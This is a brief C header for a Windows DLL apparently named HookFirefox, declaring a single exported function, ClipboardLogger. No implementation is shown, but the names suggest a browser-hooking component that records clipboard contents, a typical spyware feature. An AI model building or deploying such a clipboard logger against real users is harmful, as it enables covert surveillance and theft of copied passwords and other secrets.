#pragma once
#ifdef HOOKFIREFOX_EXPORTS
#define HOOKFIREFOX_API __declspec(dllexport)
#else
#define HOOKFIREFOX_API __declspec(dllimport)
#endif

void ClipboardLogger(void);